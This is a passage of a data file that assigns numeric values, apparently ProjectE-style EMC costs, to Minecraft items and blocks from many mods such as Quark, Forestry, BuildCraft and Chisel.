  ""mocreatures:wyvstone_pressure_plate|0"": 3,
  ""minecraft:stained_hardened_clay|10"": 64,
  ""minecraft:stained_hardened_clay|9"": 64,
  ""minecraft:stained_hardened_clay|8"": 64,
  ""extratrees:fence.gates.fir|0"": 32,
  ""minecraft:comparator|0"": 463,
  ""quark:stained_clay_tiles_light_blue_slab|0"": 32,
  ""irontanks:iron_tank|0"": 784,
  ""minecraft:beef|0"": 64,
  ""minecraft:stonebrick|0"": 1,
  ""forestry:doors.baobab|0"": 16,
  ""minecraft:stonebrick|1"": 9,
  ""minecraft:stonebrick|2"": 1,
  ""minecraft:stonebrick|3"": 1,
  ""quark:dark_oak_trapdoor|0"": 8,
  ""blockcraftery:editable_pressure_plate_items|0"": 16,
  ""minecraft:wooden_pickaxe|0"": 32,
  ""quark:framed_glass_pane|0"": 96,
  ""ic2:blockmetal|12"": 288,
  ""ic2:blockmetal|11"": 4608,
  ""ic2:blockmetal|8"": 2304,
  ""ic2:blockmetal|7"": 1152,
  ""minecraft:iron_boots|0"": 1024,
  ""chiselsandbits:chisel_diamond|0"": 8196,
  ""galacticraftplanets:asteroids_block|1"": 8,
  ""galacticraftplanets:asteroids_block|0"": 8,
  ""galacticraftplanets:asteroids_block|2"": 8,
  ""minecraft:end_bricks|0"": 1,
  ""irontanks:iron_gold_upgrade|0"": 8449,
  ""cathedral:cathedral_glass_stained|0"": 62,
  ""cathedral:cathedral_glass_stained|1"": 62,
  ""minecraft:feather|0"": 48,
  ""minecraft:log|0"": 32,
  ""minecraft:log|1"": 32,
  ""minecraft:log|2"": 32,
  ""minecraft:log|3"": 32,
  ""extratrees:doors.gingko|0"": 16,
  ""quark:arrow_ender|0"": 1038,
  ""cathedral:cathedral_gargoyle_demon_endstone|0"": 253,
  ""quark:stained_planks_yellow_stairs|0"": 6,
  ""quark:variant_leaves|1"": 1,
  ""quark:variant_leaves|0"": 1,
  ""forestry:doors.lime|0"": 16,
  ""minecraft:diamond|0"": 8192,
  ""extratrees:stairs.cypress|0"": 6,
  ""minecraft:black_glazed_terracotta|0"": 64,
  ""mocreatures:deep_wyvstone_wall|0"": 1,
  ""forestry:stairs.kapok|0"": 6,
  ""forestry:stairs.willow|0"": 6,
  ""minecraft:blue_glazed_terracotta|0"": 64,
  ""minecraft:sandstone_stairs|0"": 3,
  ""quark:iron_ladder|0"": 112,
  ""railcraft:infernal_brick_stairs|0"": 39,
  ""chiselsandbits:wrench_wood|0"": 24,
  ""railcraft:nether|1"": 4,
  ""railcraft:nether|3"": 4,
  ""railcraft:nether|2"": 4,
  ""railcraft:nether|5"": 4,
  ""railcraft:nether|4"": 28,
  ""minecraft:slime_ball|0"": 32,
  ""quark:prismarine_dark_slab|0"": 1032,
  ""minecraft:sticky_piston|0"": 380,
  ""forestry:stairs.zebrawood|0"": 6,
  ""quark:sandstone_bricks_slab|0"": 2,
  ""binniecore:glass|0"": 1,
  ""chisel:planks-dark-oak|14"": 8,
  ""minecraft:nether_brick|0"": 4,
  ""chisel:planks-dark-oak|12"": 8,
  ""chisel:planks-dark-oak|13"": 8,
  ""chisel:planks-dark-oak|10"": 8,
  ""chisel:planks-dark-oak|11"": 8,
  ""chisel:planks-dark-oak|8"": 8,
  ""quark:colored_flowerpot_silver|0"": 64,
  ""chisel:planks-dark-oak|9"": 8,
  ""chisel:planks-dark-oak|6"": 8,
  ""chisel:planks-dark-oak|7"": 8,
  ""minecraft:glowstone|0"": 1536,
  ""chisel:planks-dark-oak|4"": 8,
  ""chisel:planks-dark-oak|5"": 8,
  ""chisel:planks-dark-oak|2"": 8,
  ""chisel:planks-dark-oak|3"": 8,
  ""chisel:planks-dark-oak|0"": 8,
  ""chisel:planks-dark-oak|1"": 8,
  ""quark:horse_whistle|0"": 64,
  ""minecraft:tripwire_hook|0"": 134,
  ""quark:brick_wall|0"": 64,
  ""quark:sturdy_stone|0"": 2,
  ""minecraft:birch_stairs|0"": 6,
  ""chisel:waterstone|0"": 1,
  ""minecraft:daylight_detector|0"": 783,
  ""quark:jungle_trapdoor|0"": 8,
  ""quark:stonebrick_mossy_stairs|0"": 6,
  ""minecraft:fence|0"": 13,
  ""minecraft:planks|5"": 8,
  ""extratrees:planks.0|6"": 8,
  ""extratrees:planks.1|7"": 8,
  ""minecraft:planks|4"": 8,
  ""extratrees:planks.0|7"": 8,
  ""extratrees:planks.1|6"": 8,
  ""extratrees:planks.0|4"": 8,
  ""extratrees:planks.1|5"": 8,
  ""extratrees:planks.0|5"": 8,
  ""extratrees:planks.1|4"": 8,
  ""quark:stained_clay_tiles_white_stairs|0"": 48,
  ""minecraft:planks|1"": 8,
  ""extratrees:planks.0|2"": 8,
  ""extratrees:planks.1|3"": 8,
  ""extratrees:planks.2|0"": 8,
  ""minecraft:planks|0"": 8,
  ""extratrees:planks.0|3"": 8,
  ""extratrees:planks.1|2"": 8,
  ""extratrees:planks.2|1"": 8,
  ""quark:duskbound_block_slab|0"": 50,
  ""minecraft:planks|3"": 8,
  ""extratrees:planks.0|0"": 8,
  ""extratrees:planks.1|1"": 8,
  ""extratrees:planks.2|2"": 8,
  ""minecraft:planks|2"": 8,
  ""extratrees:planks.0|1"": 8,
  ""extratrees:planks.1|0"": 8,
  ""extratrees:planks.2|3"": 8,
  ""extratrees:planks.0|14"": 8,
  ""extratrees:planks.1|15"": 8,
  ""extratrees:planks.0|15"": 8,
  ""extratrees:planks.1|14"": 8,
  ""extratrees:planks.0|12"": 8,
  ""extratrees:planks.1|13"": 8,
  ""extratrees:planks.0|13"": 8,
  ""extratrees:planks.1|12"": 8,
  ""forestry:ingot_bronze|0"": 160,
  ""minecraft:record_chirp|0"": 2048,
  ""extratrees:planks.0|10"": 8,
  ""extratrees:planks.1|11"": 8,
  ""extratrees:planks.0|11"": 8,
  ""extratrees:planks.1|10"": 8,
  ""extratrees:planks.0|8"": 8,
  ""extratrees:planks.1|9"": 8,
  ""extratrees:planks.0|9"": 8,
  ""extratrees:planks.1|8"": 8,
  ""quark:turf_stairs|0"": 3,
  ""buildcrafttransport:pipe_diamond_item|16"": 2048,
  ""buildcrafttransport:pipe_diamond_item|5"": 2048,
  ""buildcrafttransport:pipe_diamond_item|4"": 2048,
  ""buildcrafttransport:pipe_diamond_item|7"": 2048,
  ""buildcrafttransport:pipe_diamond_item|6"": 2048,
  ""buildcrafttransport:pipe_diamond_item|1"": 2048,
  ""buildcrafttransport:pipe_diamond_item|3"": 2048,
  ""buildcrafttransport:pipe_diamond_item|2"": 2048,
  ""minecraft:wooden_slab|1"": 4,
  ""buildcrafttransport:pipe_diamond_item|13"": 2048,
  ""minecraft:wooden_slab|0"": 4,
  ""buildcrafttransport:pipe_diamond_item|12"": 2048,
  ""minecraft:wooden_slab|3"": 4,
  ""buildcrafttransport:pipe_diamond_item|15"": 2048,
  ""minecraft:wooden_slab|2"": 4,
  ""buildcrafttransport:pipe_diamond_item|14"": 2048,
  ""minecraft:wooden_slab|5"": 4,
  ""buildcrafttransport:pipe_diamond_item|9"": 2048,
  ""minecraft:wooden_slab|4"": 4,
  ""buildcrafttransport:pipe_diamond_item|8"": 2048,
  ""buildcrafttransport:pipe_diamond_item|11"": 2048,
  ""minecraft:lit_pumpkin|0"": 153,
  ""buildcrafttransport:pipe_diamond_item|10"": 2048,
  ""quark:prismarine_bricks_wall|0"": 2304,
  ""quark:chute|0"": 44,
  ""minecraft:anvil|0"": 7936,
  ""minecraft:obsidian|0"": 64,
  ""extratrees:stairs.ash|0"": 6,
  ""projectred-exploration:sapphire_sickle|0"": 3076,
  ""minecraft:beetroot_seeds|0"": 16,
  ""microblockcbe:saw_stone|0"": 18,
  ""blockcraftery:editable_door_reinforced|0"": 66,
  ""quark:icy_stone_slab|0"": 32,
  ""minecraft:compass|0"": 1088,
  ""mocreatures:wyvwood_pressure_plate|0"": 24,
  ""forestry:doors.ipe|0"": 16,
  ""minecraft:cake|0"": 216,
  ""galacticraftcore:basic_block_core|13"": 288,
  ""galacticraftcore:basic_block_core|11"": 1152,
  ""chisel:bookshelf_darkoak|0"": 504,
  ""quark:stained_clay_tiles_light_blue_stairs|0"": 48,
  ""quark:limestone_wall|0"": 1,
  ""minecraft:jungle_fence_gate|0"": 32,
  ""forestry:stairs.balsa|0"": 6,
  ""railcraft:bloodstained_brick_stairs|0"": 27,
  ""quark:soul_sandstone_wall|0"": 196,
  ""quark:cobbed_stone_wall|0"": 16,
  ""chisel:glassdyedlightgray|3"": 1,
  ""chisel:glassdyedlightgray|2"": 1,
  ""chisel:glassdyedlightgray|1"": 1,
  ""chisel:glassdyedlightgray|0"": 1,
  ""extratrees:fence.gates.holly|0"": 32,
  ""chisel:antiblock|15"": 49,
  ""minecraft:cooked_mutton|0"": 64,
  ""chisel:glassdyedlightgray|5"": 1,
  ""chisel:glassdyedlightgray|4"": 1,
  ""quark:stone_granite_slab|0"": 8,
  ""extratrees:fence.gates.hawthorn|0"": 32,
  ""chisel:glassdyedpink|0"": 1,
  ""chisel:glassdyedpink|1"": 1,
  ""chisel:glassdyedpink|2"": 1,
  ""chisel:glassdyedpink|3"": 1,
  ""chisel:glassdyedpink|4"": 1,
  ""chisel:glassdyedpink|5"": 1,
  ""quark:stained_clay_tiles_red_slab|0"": 32,
  ""minecraft:wooden_hoe|0"": 24,
  ""mocreatures:wyvwood_door|0"": 16,
  ""minecraft:pumpkin|0"": 144,
  ""quark:stained_planks_purple_stairs|0"": 6,
  ""minecraft:bookshelf|0"": 528,
  ""minecraft:stone_sword|0"": 6,
  ""galacticraftcore:basic_item|17"": 928,
  ""galacticraftcore:basic_item|16"": 1024,
  ""galacticraftcore:basic_item|18"": 1024,
  ""quark:stonebrick_mossy_wall|0"": 9,
  ""galacticraftcore:basic_item|15"": 1152,
  ""galacticraftcore:basic_item|5"": 128,
  ""galacticraftcore:basic_item|4"": 256,
  ""extratrees:fence.gates.hornbeam|0"": 32,
  ""galacticraftcore:basic_item|3"": 128,
  ""galacticraftcore:basic_item|2"": 32,
  ""forbiddenmagicre:resourcefm|0"": 1820,
  ""minecraft:golden_leggings|0"": 14336,
  ""quark:bark_birch_wall|0"": 32,
  ""quark:duskbound_lantern|0"": 456,
  ""quark:elder_prismarine|1"": 288,
  ""quark:elder_prismarine|0"": 128,
  ""quark:sandy_bricks_stairs|0"": 48,
  ""quark:elder_prismarine|2"": 1040,
  ""minecraft:sapling|4"": 32,
  ""minecraft:sapling|5"": 32,
  ""mocreatures:wyvstone|0"": 1,
  ""minecraft:sapling|0"": 32,
  ""minecraft:sapling|1"": 32,
  ""minecraft:sapling|2"": 32,
  ""minecraft:sapling|3"": 32,
  ""galacticraftcore:ic2compat|2"": 128,
  ""galacticraftcore:ic2compat|0"": 128,
  ""minecraft:boat|0"": 40,
  ""forestry:doors.sequoia|0"": 16,
  ""galacticraftcore:moon_stairs_stone|0"": 1,
  ""minecraft:melon_block|0"": 144,
  ""minecraft:spruce_boat|0"": 40,
  ""extratrees:doors.alder|0"": 16,
  ""minecraft:paper|0"": 32,
  ""railcraft:diorite|1"": 16,
  ""railcraft:diorite|0"": 16,
  ""extratrees:fence.gates.butternut|0"": 32,
  ""railcraft:diorite|3"": 16,
  ""railcraft:diorite|5"": 16,
  ""railcraft:diorite|4"": 40,
  ""forestry:stairs.larch|0"": 6,
  ""extratrees:doors.cedar|0"": 16,
  ""minecraft:trapped_chest|0"": 198,
  ""minecraft:fire_charge|0"": 330,
  ""forestry:apatite|0"": 32,
  ""mocreatures:cobbled_wyvstone_wall|0"": 1,
  ""galacticraftcore:food|9"": 960,
  ""galacticraftcore:food|8"": 125,
  ""galacticraftcore:food|1"": 1024,
  ""quark:colored_flowerpot_brown|0"": 176,
  ""galacticraftcore:food|0"": 1152,
  ""galacticraftcore:food|3"": 1024,
  ""galacticraftcore:food|2"": 928,
  ""galacticraftcore:food|5"": 48,
  ""galacticraftcore:food|4"": 45,
  ""extratrees:doors.apple|0"": 16,
  ""galacticraftcore:food|7"": 32,
  ""galacticraftcore:food|6"": 32,
  ""minecraft:brick_stairs|0"": 48,
  ""minecraft:blaze_rod|0"": 1536,
  ""minecraft:heavy_weighted_pressure_plate|0"": 512,
  ""zettaindustries:sulfurblock|0"": 448,
  ""cathedral:cathedral_gargoyle_demon_packedice|0"": 265,
  ""forestry:stairs.acacia|0"": 6,
  ""minecraft:shield|0"": 304,
  ""projecte:item.pe_matter|1"": 466944,
  ""projecte:item.pe_matter|0"": 139264,
  ""quark:stone_wall|0"": 1,
  ""quark:stained_planks_red_stairs|0"": 6,
  ""minecraft:golden_sword|0"": 4100,
  ""quark:magma_bricks_stairs|0"": 48,
  ""quark:stained_planks_black_stairs|0"": 6,
  ""extratrees:stairs.beech|0"": 6,
  ""buildcrafttransport:pipe_emerald_power|1"": 4160,
  ""buildcrafttransport:pipe_emerald_power|2"": 4160,
  ""buildcrafttransport:pipe_emerald_power|3"": 4160,
  ""buildcrafttransport:pipe_emerald_power|4"": 4160,
  ""buildcrafttransport:pipe_emerald_power|5"": 4160,
  ""railcraft:metal|8"": 2304,
  ""buildcrafttransport:pipe_emerald_power|6"": 4160,
  ""buildcrafttransport:pipe_emerald_power|7"": 4160,
  ""railcraft:metal|9"": 1377,
  ""railcraft:metal|6"": 9216,
  ""buildcrafttransport:pipe_emerald_power|8"": 4160,
  ""railcraft:pearlized_brick_stairs|0"": 96,
  ""buildcrafttransport:pipe_emerald_power|9"": 4160,
  ""railcraft:metal|7"": 4608,
  ""buildcrafttransport:pipe_emerald_power|10"": 4160,
  ""buildcrafttransport:pipe_emerald_power|11"": 4160,
  ""railcraft:metal|2"": 4608,
  ""buildcrafttransport:pipe_emerald_power|12"": 4160,
  ""buildcrafttransport:pipe_emerald_power|13"": 4160,
  ""buildcrafttransport:pipe_emerald_power|14"": 4160,
  ""buildcrafttransport:pipe_emerald_power|15"": 4160,
  ""buildcrafttransport:pipe_emerald_power|16"": 4160,
  ""minecraft:gray_glazed_terracotta|0"": 64,
  ""minecraft:golden_chestplate|0"": 16384,
  ""minecraft:wheat_seeds|0"": 16,
  ""minecraft:stone_pressure_plate|0"": 2,
  ""minecraft:shears|0"": 512,
  ""minecraft:iron_nugget|0"": 28,
  ""minecraft:record_cat|0"": 2048,
  ""minecraft:diamond_pickaxe|0"": 24584,
  ""minecraft:cobblestone_wall|0"": 1,
  ""minecraft:cobblestone_wall|1"": 9,
  ""extratrees:doors.elm|0"": 16,
  ""minecraft:mushroom_stew|0"": 70,
  ""quark:duskbound_block|0"": 100,
  ""botany:stained|0"": 1,
  ""minecraft:dye|8"": 32,
  ""galacticraftcore:cheese|0"": 272,
  ""minecraft:dye|9"": 16,
  ""minecraft:dye|10"": 28,
  ""minecraft:dye|11"": 16,
  ""minecraft:dye|12"": 16,
  ""minecraft:dye|13"": 16,
  ""minecraft:dye|14"": 16,
  ""minecraft:dye|15"": 48,
  ""minecraft:dye|0"": 16,
  ""cathedral:cathedral_chain_various|3"": 10,
  ""minecraft:dye|1"": 16,
  ""quark:stained_clay_tiles_purple_stairs|0"": 48,
  ""minecraft:dye|2"": 8,
  ""cathedral:cathedral_chain_various|1"": 170,
  ""quark:stone_diorite_bricks_slab|0"": 8,
  ""minecraft:dye|3"": 128,
  ""cathedral:cathedral_chain_various|0"": 21,
  ""minecraft:dye|4"": 864,
  ""extratrees:stairs.pear|0"": 6,
  ""minecraft:dye|5"": 440,
  ""minecraft:dye|6"": 436,
  ""cathedral:cathedral_chain_various|5"": 42,
  ""minecraft:dye|7"": 16,
  ""mocreatures:mossy_cobbled_wyvstone|0"": 2,
  ""minecraft:waterlily|0"": 16,
  ""minecraft:grass_path|0"": 1,
  ""forestry:stairs.plum|0"": 6,
  ""quark:stained_clay_tiles_black_slab|0"": 32,
  ""quark:stained_clay_tiles_yellow_slab|0"": 32,
  ""forestry:ingot_copper|0"": 128,
  ""projectred-exploration:sapphire_shovel|0"": 1032,
  ""minecraft:leather_helmet|0"": 320,
  ""minecraft:string|0"": 12,
  ""irontanks:gold_tank|0"": 5912,
  ""minecraft:diamond_sword|0"": 16388,
  ""quark:smoker|0"": 128,
  ""quark:reed_block_slab|0"": 144,
  ""minecraft:diamond_axe|0"": 24584,
  ""quark:sandstone_smooth_slab|0"": 2,
  ""minecraft:gold_block|0"": 18432,
  ""cathedral:cathedral_gargoyle_demon_netherbrick|0"": 265,
  ""minecraft:red_nether_brick|0"": 50,
  ""minecraft:bone_block|0"": 432,
  ""projecte:dm_furnace|0"": 4456456,
  ""quark:spruce_pressure_plate|0"": 16,
  ""minecraft:redstone_lamp|0"": 1792,
  ""minecraft:banner|11"": 304,
  ""minecraft:banner|10"": 310,
  ""minecraft:banner|9"": 304,
  ""minecraft:banner|8"": 316,
  ""minecraft:banner|15"": 292,
  ""minecraft:banner|14"": 304,
  ""minecraft:banner|13"": 304,
  ""minecraft:banner|12"": 304,
  ""minecraft:banner|3"": 388,
  ""minecraft:banner|2"": 298,
  ""minecraft:banner|1"": 304,
  ""minecraft:banner|0"": 304,
  ""minecraft:banner|7"": 304,
  ""minecraft:banner|6"": 616,
  ""minecraft:banner|5"": 622,
  ""minecraft:banner|4"": 940,
  ""quark:turf|0"": 4,
  ""extratrees:stairs.box|0"": 6,
  ""irontanks:void_tank|0"": 92,
  ""extratrees:doors.iroko|0"": 16,
  ""extratrees:doors.whitebeam|0"": 16,
  ""minecraft:soul_sand|0"": 49,
  ""quark:polished_netherrack_bricks_slab|0"": 2,
  ""minecraft:map|0"": 256,
  ""botany:trowel_stone|0"": 6,
  ""buildcraftcore:decorated|5"": 68,
  ""railcraft:pearlized|1"": 129,
  ""extratrees:doors.holly|0"": 16,
  ""railcraft:granite|0"": 16,
  ""railcraft:pearlized|0"": 129,
  ""railcraft:granite|1"": 16,
  ""railcraft:pearlized|3"": 129,
  ""botany:trowel_gold|0"": 2053,
  ""railcraft:pearlized|2"": 129,
  ""railcraft:granite|3"": 16,
  ""railcraft:pearlized|5"": 129,
  ""railcraft:granite|4"": 40,
  ""railcraft:granite|5"": 16,
  ""railcraft:pearlized|4"": 153,
  ""extratrees:fence.gates.brazilwood|0"": 32,
  ""projectred-exploration:peridot_saw|0"": 2060,
  ""chisel:paper|0"": 8,
  ""chisel:cobblestone|0"": 1,
  ""chisel:cobblestone|1"": 1,
  ""chisel:cobblestone|2"": 1,
  ""chisel:cobblestone|3"": 1,
  ""chisel:cobblestone|4"": 1,
  ""chisel:cobblestone|5"": 1,
  ""forestry:fence.gates.padauk|0"": 32,
  ""chisel:cobblestone|6"": 1,
  ""chisel:cobblestone|7"": 1,
  ""chisel:cobblestone|8"": 1,
  ""chisel:cobblestone|9"": 1,
  ""chisel:cobblestone|10"": 1,
  ""minecraft:torch|0"": 9,
  ""chisel:cobblestone|11"": 1,
  ""quark:stained_clay_tiles_white_slab|0"": 32,
  ""chiselsandbits:chisel_stone|0"": 5,
  ""chisel:cobblestone|12"": 1,
  ""chisel:cobblestone|13"": 1,
  ""chisel:cobblestone|14"": 1,
  ""chisel:cobblestone|15"": 1,
  ""ironchest:vanilla_copper_shulker_upgrade|0"": 3072,
  ""galacticraftcore:slab_gc_half|4"": 2,
  ""galacticraftcore:slab_gc_half|2"": 1,
  ""chisel:limestone2|7"": 1,
  ""extratrees:doors.eucalyptus|0"": 16,
  ""forestry:fence.gates.maple|0"": 32,
  ""minecraft:record_mellohi|0"": 2048,
  ""minecraft:fish|0"": 64,
  ""minecraft:fish|1"": 64,
  ""minecraft:fish|2"": 64,
  ""minecraft:fish|3"": 64,
  ""forestry:fence.gates.willow|0"": 32,
  ""projectred-exploration:ruby_axe|0"": 3080,
  ""quark:stone_granite_bricks_slab|0"": 8,
  ""railcraft:pearlized_slab|0"": 64,
  ""railcraft:pearlized_slab|1"": 64,
  ""minecraft:stone_shovel|0"": 9,
  ""minecraft:beetroot|0"": 64,
  ""minecraft:saddle|0"": 192,
  ""quark:vertical_planks|1"": 8,
  ""quark:vertical_planks|0"": 8,
  ""quark:vertical_planks|3"": 8,
  ""minecraft:wooden_door|0"": 16,
  ""quark:vertical_planks|2"": 8,
  ""quark:vertical_planks|5"": 8,
  ""quark:vertical_planks|4"": 8,
  ""projecte:item.pe_covalence_dust|1"": 8,
  ""projecte:item.pe_covalence_dust|0"": 1,
  ""projecte:item.pe_covalence_dust|2"": 208,
  ""quark:lit_lamp|0"": 1860,
  ""mocreatures:mossy_cobbled_deep_wyvstone|0"": 2,
  ""minecraft:melon_seeds|0"": 16,
  ""extratrees:stairs.pinkivory|0"": 6,
  ""railcraft:abyssal_brick_stairs|0"": 24,
  ""quark:polished_netherrack|0"": 4,
  ""quark:polished_netherrack|1"": 4,
  ""minecraft:golden_carrot|0"": 1880,
  ""minecraft:quartz|0"": 256,
  ""quark:stained_clay_tiles_green_stairs|0"": 48,
  ""ironchest:copper_silver_chest_upgrade|0"": 4224,
  ""extratrees:fence.gates.locust|0"": 32,
  ""quark:stained_clay_tiles_green_slab|0"": 32,
  ""quark:red_sandstone_bricks_slab|0"": 2,
  ""railcraft:frostbound_brick_stairs|0"": 84,
  ""minecraft:jungle_fence|0"": 13,
  ""minecraft:red_sandstone|1"": 4,
  ""minecraft:red_sandstone|0"": 4,
  ""minecraft:red_sandstone|2"": 4,
  ""forestry:stairs.lime|0"": 6,
  ""quark:stone_granite_bricks_stairs|0"": 12,
  ""projectred-exploration:peridot_axe|0"": 3080,
  ""buildcrafttransport:pipe_emerald_item|1"": 4096,
  ""buildcrafttransport:pipe_emerald_item|2"": 4096,
  ""buildcrafttransport:pipe_emerald_item|3"": 4096,
  ""buildcrafttransport:pipe_emerald_item|4"": 4096,
  ""minecraft:porkchop|0"": 64,
  ""buildcrafttransport:pipe_emerald_item|5"": 4096,
  ""minecraft:end_stone|0"": 1,
  ""buildcrafttransport:pipe_emerald_item|6"": 4096,
  ""buildcrafttransport:pipe_emerald_item|7"": 4096,
  ""buildcrafttransport:pipe_emerald_item|8"": 4096,
  ""buildcrafttransport:pipe_emerald_item|9"": 4096,
  ""buildcrafttransport:pipe_emerald_item|10"": 4096,
  ""buildcrafttransport:pipe_emerald_item|11"": 4096,
  ""buildcrafttransport:pipe_emerald_item|12"": 4096,
  ""buildcrafttransport:pipe_emerald_item|13"": 4096,
  ""buildcrafttransport:pipe_emerald_item|14"": 4096,
  ""buildcrafttransport:pipe_emerald_item|15"": 4096,
  ""buildcrafttransport:pipe_emerald_item|16"": 4096,
  ""ic2:blockrubwood|0"": 32,
  ""minecraft:redstone_torch|0"": 68,
  ""botany:trowel_wood|0"": 13,
  ""projectred-exploration:ruby_saw|0"": 2060,
  ""extratrees:fence.gates.eucalyptus|0"": 32,
  ""minecraft:prismarine_shard|0"": 256,
  ""extratrees:fence.gates.olive|0"": 32,
  ""quark:elder_prismarine_dark_slab|0"": 520,
  ""forestry:fence.gates.mahoe|0"": 32,
  ""quark:icy_stone_stairs|0"": 48,
  ""extratrees:stairs.hickory|0"": 6,
  ""minecraft:sugar|0"": 32,
  ""minecraft:prismarine|2"": 2064,
  ""quark:jungle_button|0"": 8,
  ""minecraft:prismarine|0"": 1024,
  ""minecraft:prismarine|1"": 2304,
  ""minecraft:gravel|0"": 4,
  ""extratrees:doors.hemlock|0"": 16,
  ""quark:paper_wall_big|0"": 20,
  ""quark:acacia_trapdoor|0"": 8,
  ""blockcraftery:editable_pressure_plate_player|0"": 16,
  ""quark:dark_prismarine_wall|0"": 2064,
  ""quark:soul_sandstone_bricks_slab|0"": 98,
  ""quark:polished_netherrack_bricks_stairs|0"": 3,
  ""quark:midori_block|0"": 8,
  ""quark:fire_stone_stairs|0"": 48,
  ""minecraft:yellow_flower|0"": 16,
  ""quark:stained_planks_cyan_slab|0"": 4,
  ""minecraft:iron_hoe|0"": 520,
  ""mocreatures:gleaming_glass|0"": 1,
  ""railcraft:sandy_slab|0"": 17,
  ""minecraft:record_blocks|0"": 2048,
  ""railcraft:sandy_slab|1"": 17,
  ""extratrees:fence.gates.elder|0"": 32,
  ""projecte:dm_pedestal|0"": 4653056,
  ""quark:polished_netherrack_bricks_wall|0"": 4,
  ""minecraft:potato|0"": 64,
  ""quark:prismarine_dark_stairs|0"": 1548,
  ""railcraft:sandy_paver_stairs|0"": 25,
  ""railcraft:dust|5"": 64,
  ""extratrees:doors.rosewood|0"": 16,
  ""railcraft:dust|3"": 16,
  ""railcraft:dust|2"": 72,
  ""projecte:nova_catalyst|0"": 1506,
  ""railcraft:dust|1"": 32,
  ""chisel:glassdyedred|4"": 1,
  ""extratrees:doors.ash|0"": 16,
  ""chisel:glassdyedred|5"": 1,
  ""mocreatures:mossy_cobbled_deep_wyvstone_wall|0"": 2,
  ""chisel:glassdyedred|0"": 1,
  ""chisel:glassdyedred|1"": 1,
  ""chisel:glassdyedred|2"": 1,
  ""extratrees:stairs.rowan|0"": 6,
  ""chisel:glassdyedred|3"": 1,
  ""minecraft:purple_glazed_terracotta|0"": 64,
  ""minecraft:iron_pickaxe|0"": 776,
  ""quark:custom_chest|0"": 64,
  ""chisel:planks-jungle|14"": 8,
  ""quark:custom_chest|1"": 64,
  ""chisel:planks-jungle|13"": 8,
  ""quark:custom_chest|2"": 64,
  ""chisel:planks-jungle|12"": 8,
  ""quark:custom_chest|3"": 64,
  ""chisel:planks-jungle|11"": 8,
  ""quark:custom_chest|4"": 64,
  ""chisel:planks-jungle|10"": 8,
  ""chisel:planks-jungle|9"": 8,
  ""chisel:planks-jungle|8"": 8,
  ""chisel:planks-jungle|7"": 8,
  ""quark:stained_clay_tiles_black_stairs|0"": 48,
  ""chisel:planks-jungle|6"": 8,
  ""chisel:planks-jungle|5"": 8,
  ""chisel:planks-jungle|4"": 8,
  ""blockcraftery:editable_block_reinforced|0"": 33,
  ""chisel:planks-jungle|3"": 8,
  ""chisel:planks-jungle|2"": 8,
  ""chisel:planks-jungle|1"": 8,
  ""chisel:planks-jungle|0"": 8,
  ""quark:stone_andesite_stairs|0"": 12,
  ""quark:quartz_wall|0"": 1024,
  ""minecraft:concrete_powder|2"": 4,
  ""minecraft:concrete_powder|3"": 4,
  ""minecraft:concrete_powder|0"": 8,
  ""minecraft:concrete_powder|1"": 4,
  ""minecraft:concrete_powder|6"": 4,
  ""minecraft:concrete_powder|7"": 6,
  ""minecraft:concrete_powder|4"": 4,
  ""minecraft:concrete_powder|5"": 6,
  ""minecraft:concrete_powder|10"": 57,
  ""minecraft:concrete_powder|11"": 110,
  ""minecraft:concrete_powder|8"": 4,
  ""minecraft:concrete_powder|9"": 57,
  ""minecraft:concrete_powder|14"": 4,
  ""minecraft:concrete_powder|15"": 4,
  ""minecraft:concrete_powder|12"": 18,
  ""minecraft:concrete_powder|13"": 3,
  ""minecraft:sand|0"": 1,
  ""minecraft:sand|1"": 1,
  ""minecraft:purpur_slab|0"": 96,
  ""projecte:alchemical_chest|0"": 8987,
  ""extratrees:stairs.yew|0"": 6,
  ""mocreatures:wyvwood_trapdoor|0"": 24,
  ""forestry:doors.kapok|0"": 16,
  ""minecraft:bowl|0"": 6,
  ""chisel:glassdyedlightblue|0"": 1,
  ""chisel:glassdyedlightblue|1"": 1,
  ""chisel:glassdyedlightblue|2"": 1,
  ""chisel:glassdyedlightblue|3"": 1,
  ""chisel:glassdyedlightblue|4"": 1,
  ""chisel:glassdyedlightblue|5"": 1,
  ""quark:stained_clay_tiles_silver_slab|0"": 32,
  ""quark:stained_planks_magenta_slab|0"": 4,
  ""translocators:diamond_nugget|0"": 910,
  ""quark:jungle_pressure_plate|0"": 16,
  ""quark:sandstone_new|2"": 4,
  ""forestry:stairs.ipe|0"": 6,
  ""quark:sandstone_new|3"": 4,
  ""quark:sandstone_new|0"": 4,
  ""minecraft:melon|0"": 16,
  ""quark:sandstone_new|1"": 4,
  ""quark:polished_stone|0"": 1,
  ""blockcraftery:editable_wall|0"": 8,
  ""quark:sandstone_new|4"": 196,
  ""quark:sandstone_new|5"": 196,
  ""minecraft:iron_door|0"": 512,
  ""minecraft:noteblock|0"": 128,
  ""quark:bark_jungle_stairs|0"": 24,
  ""chisel:glassdyedbrown|5"": 1,
  ""chisel:glassdyedbrown|4"": 1,
  ""minecraft:iron_helmet|0"": 1280,
  ""chisel:glassdyedbrown|1"": 1,
  ""chisel:glassdyedbrown|0"": 1,
  ""chisel:glassdyedbrown|3"": 1,
  ""chisel:glassdyedbrown|2"": 1,
  ""extratrees:doors.olive|0"": 16,
  ""minecraft:mutton|0"": 64,
  ""quark:stonebrick_wall|0"": 1,
  ""minecraft:record_far|0"": 2048,
  ""extratrees:doors.locust|0"": 16,
  ""minecraft:shulker_shell|0"": 2048,
  ""railcraft:abyssal_slab|1"": 16,
  ""railcraft:abyssal_slab|0"": 16,
  ""minecraft:wooden_pressure_plate|0"": 16,
  ""minecraft:white_glazed_terracotta|0"": 64,
  ""chisel:chisel_iron|0"": 260,
  ""forestry:fence.gates.citrus|0"": 32,
  ""blockcraftery:editable_block|0"": 8,
  ""extratrees:doors.pear|0"": 16,
  ""buildcrafttransport:pipe_lapis_item|11"": 1944,
  ""buildcrafttransport:pipe_lapis_item|10"": 1944,
  ""buildcrafttransport:pipe_lapis_item|9"": 1944,
  ""buildcrafttransport:pipe_lapis_item|8"": 1944,
  ""buildcrafttransport:pipe_lapis_item|15"": 1944,
  ""buildcrafttransport:pipe_lapis_item|14"": 1944,
  ""buildcrafttransport:pipe_lapis_item|13"": 1944,
  ""buildcrafttransport:pipe_lapis_item|12"": 1944,
  ""buildcrafttransport:pipe_lapis_item|3"": 1944,
  ""buildcrafttransport:pipe_lapis_item|2"": 1944,
  ""buildcrafttransport:pipe_lapis_item|1"": 1944,
  ""buildcrafttransport:pipe_lapis_item|7"": 1944,
  ""buildcrafttransport:pipe_lapis_item|6"": 1944,
